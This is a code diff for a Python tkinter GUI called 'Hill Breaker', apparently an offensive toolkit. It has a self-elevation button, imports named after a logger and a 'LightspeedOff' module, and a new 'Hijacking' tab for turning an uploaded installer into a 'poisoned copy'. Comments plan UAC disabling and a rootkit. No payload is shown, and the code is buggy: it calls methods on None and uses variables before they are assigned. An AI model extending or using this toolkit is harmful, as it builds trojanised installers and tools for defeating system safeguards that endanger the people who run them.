@@ -1,41 +1,51 @@
 import tkinter
-from tkinter import ttk, messagebox
+from tkinter import messagebox, Frame, ttk, LabelFrame, Label, Button, filedialog #.ttk and tkinter widgets are diffrent, headache
 import loggermain, Jacker, LightspeedOff
 from ctypes import windll
 from sys import executable, argv
 from os import getlogin
 
 c = (windll.shell32)
+installer = ""
 
 def Main():
     root = tkinter.Tk()
-    root.geometry('500x700')
+    root.geometry('525x700')
     root.title("Hill Breaker")
 
     #Tabs
     tab = ttk.Notebook(root)
 
-    home = ttk.Frame(tab, padding=10)
-    hijacking = ttk.Frame(tab, padding=10)
-    controls = ttk.Frame(tab, padding=10)
+    home = Frame(tab,padx=10,pady=10,bg='#999999')
+    hijacking = Frame(tab,padx=10,pady=10,bg='#999999')
+    controls = Frame(tab,padx=10,pady=10,bg='#999999')
     
     tab.add(home, text='Home')
     tab.add(hijacking, text='Hijacking')
     tab.add(controls, text='Controls')
 
-    tab.pack(expand=1, fill='both')# I have no idea why I need these args :(
+    tab.pack(expand=1, fill='both')
 
     #Home
-    admin = ttk.LabelFrame(home,text="Elevation Status",padding=10)
-    status = ttk.Label(admin,text="Program is not currently elevated.").pack(anchor='nw')
+    admin = LabelFrame(home,text="Elevation Status",padx=10,pady=10,bg='#888888',borderwidth=5)
+    status = Label(admin,text="Program is not currently elevated.",bg='#888888').pack(anchor='nw')
+
     if c.IsUserAnAdmin(): # Can probably do this all with a text variable and returns and blah blah
         status.config(text="Program is running as elevated under " + getlogin()) # Probably better to just not do this in python
         elevate.config(disabled=1)
     admin.pack(anchor='nw')
 
-    elevate = ttk.Button(admin,text="Elevate",command=Elevate).pack(anchor='nw')
+    elevate = Button(admin,text="Elevate",command=Elevate,borderwidth=5).pack(anchor='nw')
 
     #Hijacker - Create fake installers, etc
+    uploader = LabelFrame(hijacking,text="Create Installer",padx=10,pady=10,bg='#888888',borderwidth=5)
+    info = Label(uploader,text="Upload installer file to create poisoned copy.",bg='#888888').pack(anchor='nw')
+    uploadfile = Button(uploader,text="Upload file",command=Upload,borderwidth=5).pack(anchor='nw')
+    uploader.pack(anchor='nw')
+
+    poisonOptions = LabelFrame(hijacking,text="Options",padx=10,pady=10,bg='#888888',borderwidth=5)
+    selected = Label(poisonOptions,text="Selected: ",bg='#888888').pack(anchor='nw')
+    poisonOptions.pack(anchor='nw')
 
     #Controller - Control local system, disable UAC, etc
 
@@ -44,6 +54,10 @@ def Main():
     #Roots - Rootkit when?
 
     root.mainloop()
+
+def Upload():
+    installer = filedialog.askopenfilename()
+    
 
 def Elevate():
     c.ShellExecuteW(None, 'runas', executable, ' '.join(argv), None, None) # Creates new program, BUT DOESNT STOP OLD ONE
